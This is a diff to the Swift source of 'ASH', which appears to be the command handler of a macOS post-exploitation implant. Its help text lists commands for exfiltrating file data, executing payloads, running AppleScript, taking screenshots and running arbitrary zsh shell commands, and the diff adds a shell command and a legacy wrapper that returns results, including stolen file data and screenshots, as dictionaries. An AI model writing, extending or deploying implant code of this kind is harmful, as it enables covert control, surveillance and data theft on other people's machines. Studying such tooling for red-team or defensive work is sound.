@@ -176,7 +176,7 @@ public class ASH {
   }
   
 //  private func stringsCmd(_ filePath: String) -> CmdResult {
-//    // TODO: - Actually make this work
+//    // TODO: - Actually make strings work like strings
 //    let file = URL(fileURLWithPath: filePath)
 //    do {
 //      let fileResults = try String(contentsOf: file, encoding: .ascii)
@@ -348,24 +348,47 @@ public class ASH {
     case .man:
         let commandResult = """
                     The following are commands ran as API calls:
-                    mkdir; --- Make a directory in your current directory.
+                    mkdir; --- Make a directory.
                     whoami; --- Print the current user.
-                    cdr; --- Go to a single folder from your current directory.
                     cd; --- Change directories.
                     ls; --- List the directory.
                     ps; --- Will list all processes not limited to user processes.
-                    strings; --- This will print the contents of a file.
+                    cat; --- This will print the contents of a file.
                     mv; --- Perform a mv command to move files/folders.
                     cp; --- Copy a file/folder.
                     screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
                     osascript; <Code> --- This will run an Apple script.
-                    exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
-                    execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
+                    exfil; <binary> --- Will grab the raw data of a file.
+                    execute; <App to Run> --- This will execute an application (no shell needed).
+                    shell; <shell command> --- Runs a command in zsh. Equivalent of `zsh -c 'shell command'`
                     """
       return .success(.string(commandResult))
     case .shell:
       guard !cmd.arguments.isEmpty else { return .failure(CmdError.notEnoughArguments("no shell command supplied")) }
       return shellCommand(cmd.arguments)
     }
+  }
+  
+  public func legacyCommand(command: String) -> NSDictionary {
+    // Adding in call to legacy version of the command call which returns an NSDictionary for backwards
+    // compatability with ASH 1.x. Note that the screenshot result isn't exactly the same as this
+    // offers the possibility of returning multiple screenshots (even if we only seem to be able to
+    // get one shot from the command.
+    var result: [String: Any]
+    let splitCmd = command.components(separatedBy: ";")
+    guard let cmd = splitCmd.first else { return [:] as NSDictionary }
+    switch self.command(command: command) {
+    case .failure(let error):
+      result = ["inCommand": cmd, "returnType": "Error", "returnData": error]
+    case .success(.string(let msg)):
+      result = ["inCommand": cmd, "returnType": "String", "returnData": msg]
+    case .success(.data(let data)):
+      let filename = splitCmd.dropFirst().first ?? ""
+      result = ["inCommand": cmd, "returnType": "Data", "fileName": filename, "returnData": data]
+    case let .success(.screenshots(timestamp: filename, screenshots: data)):
+      result = ["inCommand": cmd, "returnType": "Images", "fileName": filename, "returnData": data]
+    }
+
+    return result as NSDictionary
   }
 }
